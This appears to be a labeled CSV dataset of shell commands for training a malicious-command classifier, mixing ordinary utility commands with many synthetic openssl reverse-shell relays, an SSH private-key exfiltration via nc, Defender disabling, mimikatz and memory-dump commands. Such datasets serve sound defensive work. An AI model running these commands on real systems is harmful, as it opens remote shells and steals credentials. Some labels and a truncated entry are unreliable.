command,label,original_label,mitre_id
mysqld --log=path/to/file.log,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
sq inspect path/to/file.pgp,Benign,Benign,Benign
magick path/to/input_image.png -define jpeg:extent=512kb path/to/output_image.jpg,Benign,Benign,Benign
ssh -R 4444:localhost:6379 user@192.168.0.5,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:53,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:1433,Malicious,Synthetic,Synthetic
wasm-opt input.wasm --print,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:445 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
ssh-copy-id user@server,Benign,Synthetic,Synthetic
skicka upload path/to/local path/to/remote,Benign,Benign,Benign
find . -name photoA.jpg photoB.jpg photoC.jpg,Benign,Benign,Benign
sfdp -T svg -o path/to/image.svg path/to/input.gv,Benign,Benign,Benign
pw-reserve [-n|--name] audioN,Benign,Benign,Benign
ssh -R 8080:localhost:143 svcuser@assets-dropper.net,Context_Dependent,Synthetic,Synthetic
x11vnc -forever -viewonly,Benign,Benign,Benign
path/to/goldeneye.py url,Benign,Benign,Benign
subst,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:993,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:1433 postgres@192.168.1.25,Context_Dependent,Synthetic,Synthetic
schtasks /query /S $target.$domain,Malicious,Malicious,T1558
openssl s_client -quiet -connect 172.16.0.25:443 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
sudo homectl with username -- command command_arguments,Benign,Benign,Benign
NT AUTHORITY\SYSTEM,Malicious,Malicious,T1134
openssl s_client -quiet -connect 172.16.5.20:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8888,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:80 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:8888 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
getprop ro.vendor.product.model,Benign,Benign,Benign
"find MyApp.app -name Headers -type d -exec rm -rf ""{}"" \; 2>/dev/null",Benign,Benign,Benign
gh cache [ls|list] [-r|--ref] refs/heads/branch_name,Benign,Benign,Benign
launchctl load -w /Library/LaunchAgents/$plist_filename,Malicious,Malicious,T1543
ssh -L 8080:localhost:80 admin@192.168.1.25,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:6379 user@10.0.0.10,Context_Dependent,Synthetic,Synthetic
kcadm.sh update realms/realm_name -f path/to/file.json,Benign,Benign,Benign
Enable-PnpDevice -InstanceId 'RETRIEVED USING Get-PnpDevice COMMAND' -Confirm:$False,Benign,Benign,Benign
find root -mindepth 2 -delete,Benign,Benign,Benign
fls -r -m C: -o sector path/to/image_file,Benign,Benign,Benign
uv build [--all|--all-packages],Benign,Benign,Benign
command1 | pv [-s|--size] expected_amount_of_data_for_eta | command2,Benign,Benign,Benign
ssh -R 8080:localhost:80 user@10.10.10.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
"date -ujf%s $(($(date -jf%T ""10:36:10"" +%s) - $(date -jf%T ""10:33:56"" +%s))) +%T",Benign,Benign,Benign
ssh -L 8080:localhost:80 admin@192.168.0.50,Context_Dependent,Synthetic,Synthetic
whoami /logonid,Benign,Benign,Benign
dumpsys,Benign,Benign,Benign
ssh -R 4444:localhost:993 user@10.20.30.40,Context_Dependent,Synthetic,Synthetic
ssh -L 8080:localhost:80 support@internal.corp,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:143 user@10.10.10.25,Context_Dependent,Synthetic,Synthetic
bridge [v|vlan],Benign,Benign,Benign
kubectl attach pod_name [-c|--container] container_name,Benign,Benign,Benign
register_new_matrix_user --config path/to/homeserver.yaml,Benign,Benign,Benign
pip install --upgrade boto3,Benign,Synthetic,Synthetic
virt-sparsify path/to/image --convert qcow2|raw|vdi|... path/to/new_image,Benign,Benign,Benign
sudo $program_path -a -t 3,Context_Dependent,Malicious,T1040
"git commit [-m|--message] ""message"" --allow-empty",Benign,Benign,Benign
wlsunset -g gamma_value,Benign,Benign,Benign
fiascotopnm [-z|--fast] path/to/file.fiasco [-o|--output] output_file_basename,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9090,Malicious,Synthetic,Synthetic
"Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender-Features"" -NoRestart -ErrorAction Ignore",Malicious,Malicious,T1562
read -r ans,Benign,Benign,Benign
cat /root/.ssh/id_rsa | nc 192.168.1.100 1337,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8888,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:8080 root@172.16.0.10,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:143 user@10.10.10.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:5432 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
hddtemp [-u|--unit] C|F type:/dev/sdX,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:110,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:3389,Malicious,Synthetic,Synthetic
find . -name '*.scm',Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:6379,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:80 operator@192.168.0.5,Context_Dependent,Synthetic,Synthetic
poetry list,Benign,Benign,Benign
az storage container delete --account-name storage_account_name [-n|--name] container_name --fail-not-exist,Benign,Benign,Benign
tookie-osint [-u|--user] username [-o|--output] json [-t|--threads] 10,Benign,Benign,Benign
rm `find tmp -maxdepth 1 -name '*.mp3'`,Benign,Benign,Benign
git ls-files -z | xargs -0 wc -l,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9090,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:110,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:22 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:5432 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
gopass sync,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8888,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:53,Malicious,Synthetic,Synthetic
pamtotga path/to/file.pam > path/to/output.tga,Benign,Benign,Benign
protontricks [-l|--list],Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:1433 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:143,Malicious,Synthetic,Synthetic
vim /var/www/Dockerfile,Benign,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:22 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
cd $env:TEMP,Malicious,Malicious,T1562
ssh -L 8080:localhost:9001 audit@192.168.1.254,Context_Dependent,Synthetic,Synthetic
"mimikatz ""net::computers""",Malicious,Benign,Benign
GetADUsers.py -all -dc-ip domain_controller_ip -hashes LM_Hash:NT_Hash domain/username,Benign,Benign,Benign
phpspec run [-c|--config] path/to/configuration_file,Benign,Benign,Benign
zeroclaw gateway,Benign,Benign,Benign
flatpak run --command=sh com.example.app,Benign,Benign,Benign
znew -v path/to/file1.Z path/to/file2.Z ...,Benign,Benign,Benign
cryfs --show-ciphers,Benign,Benign,Benign
fincore --output-all path/to/file,Benign,Benign,Benign
python -c 'import sys; from os import environ as e,Malicious,Malicious,T1105
unix2dos [-i|--info] path/to/file,Benign,Benign,Benign
sudo sport install $(< path/to/list),Benign,Benign,Benign
ssh -R 4444:localhost:8888 svcuser@example.com,Context_Dependent,Synthetic,Synthetic
gdc -fintfc,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9001,Malicious,Synthetic,Synthetic
setfont font.gz,Benign,Benign,Benign
strace -e trace=file program,Context_Dependent,Benign,Benign
mkfs.erofs -U UUID image.erofs root/,Benign,Benign,Benign
quickemu --snapshot create|apply|delete tag --vm path/to/file.conf,Benign,Benign,Benign
wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs,Context_Dependent,Malicious,T1082
"sqlite3 /dev/null -cmd '.output /path/to/output-file' 'select ""DATA"";'",Malicious,Malicious,T1222
viewnior --slideshow path/to/image.ext,Benign,Benign,Benign
brotli [-d|--decompress] path/to/file.br,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:22,Malicious,Synthetic,Synthetic
apt install xclip -y,Malicious,Malicious,T1115
date /t,Benign,Benign,Benign
ssh -L 8080:localhost:993 deploy@target.com,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:22 admin@10.0.0.100,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:443,Malicious,Synthetic,Synthetic
"ps aux | awk '{print $4""\t""$11}' | sort | uniq -c | awk '{print $2"" ""$1"" ""$3}' | sort -nr",Context_Dependent,Benign,Benign
ocamlc -o path/to/binary path/to/source_file.ml,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:3389 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
nmon -f,Benign,Benign,Benign
testssl example.com,Benign,Benign,Benign
cot --wait path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
braa public@ip_range:.1.3.6.1.2.1.1.6.0,Benign,Benign,Benign
sqldumper.exe 540 0 0x01100:40,Malicious,Malicious,T1003
aws kafka describe-configuration --arn configuration_arn,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:9090 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:8080 postgres@10.0.0.1,Context_Dependent,Synthetic,Synthetic
git cherry-pick [-n|--no-commit] commit,Benign,Benign,Benign
cargo deb [-p|--package] package_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:3389 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:995 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:4445,Malicious,Synthetic,Synthetic
reg add HKCU\SOFTWARE\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f,Malicious,Malicious,T1112
openssl s_client -quiet -connect 10.10.10.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:110,Malicious,Synthetic,Synthetic
wireplumber,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:3389,Malicious,Synthetic,Synthetic
terraform show path/to/file.tfplan,Benign,Benign,Benign
turbo run build,Benign,Benign,Benign
head -16482 < file.in | tail -259 > file.out,Benign,Benign,Benign
cal [-3|--three],Benign,Benign,Benign
%APPDATA%\..\Local Settings\Temporary Internet Files\Content.Word\,Malicious,Malicious,T1070
serialver -Joption classnames,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:22 deploy@files.company.local,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:995 backup@10.10.10.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
portablectl list,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:80 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:80 deploy@corp-backup.internal,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:143,Malicious,Synthetic,Synthetic
"for variable in item1 item2 ...; do echo ""Loop is executed""; done",Benign,Benign,Benign
find / \( -name 10_Recommended* -o -name share \) -prune -o -type f \( -name firefox -0 -name thunderbird -0 -name seamonkey \) -print 2>/dev/null,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:110,Malicious,Synthetic,Synthetic
env | grep -i token,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
pipes.sh -t 0..9,Benign,Benign,Benign
exercism configure,Benign,Benign,Benign
bluekeep -noninteractive -consoleoutput,Context_Dependent,Malicious,T1046
%APPDATA%\updater.exe -Command exit,Malicious,Malicious,T1574
rev test.txt | sort -k2 | rev,Benign,Benign,Benign
ssh -R 4444:localhost:22 user@10.0.0.25,Context_Dependent,Synthetic,Synthetic
torsocks --shell,Benign,Benign,Benign
find -type d | xargs chmod 775,Benign,Benign,Benign
find src/ | entr -s 'make | sed 10q',Benign,Benign,Benign
ydotool click 0xC1,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:1433,Malicious,Synthetic,Synthetic
pycodestyle --show-source file.py,Benign,Benign,Benign
sha384sum path/to/file1 path/to/file2 ...,Benign,Benign,Benign
bun [i|install] [-p|--production],Benign,Benign,Benign
sudo lvresize [-l|--extents] 100%FREE volume_group/logical_volume,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:3389,Malicious,Synthetic,Synthetic
dnsmap example.com -c path/to/file.csv,Benign,Benign,Benign
sudo ip [ru|rule] [a|add] to 192.168.178.2/32,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:8080,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:143 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
find / \! \( -newer ttt -user wnj \) -print,Context_Dependent,Benign,Benign
satis add repository_url,Benign,Benign,Benign
find . -name *.jpg | uniq -u,Benign,Benign,Benign
ssh -R 4444:localhost:1433 audit@10.0.0.5,Context_Dependent,Synthetic,Synthetic
dnswalk -i domain.,Benign,Benign,Benign
GetNPUsers.py domain/ -usersfile path/to/userslist -dc-ip domain_controller_ip -request > path/to/output.txt,Benign,Benign,Benign
pipetron [-d|--daemon],Benign,Benign,Benign
abrt-action-analyze-backtrace -d path/to/directory,Benign,Benign,Benign
svgo test.svg,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:53 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4444,Malicious,Synthetic,Synthetic
x8 [-u|--url] https://example.com/?path=..%2faction.php%3f%s%23 --encode [-w|--wordlist] path/to/wordlist.txt,Benign,Benign,Benign
rename -v 's/\.JPG/\.jpeg/' *.JPG,Benign,Benign,Benign
gofumpt -extra -d path/to/directory,Benign,Benign,Benign
ppmtobmp -windows|os2 path/to/file.ppm > path/to/file.bmp,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8080,Malicious,Synthetic,Synthetic
pax -w path/to/file1 path/to/file2 ... > target.tar,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8080,Malicious,Synthetic,Synthetic
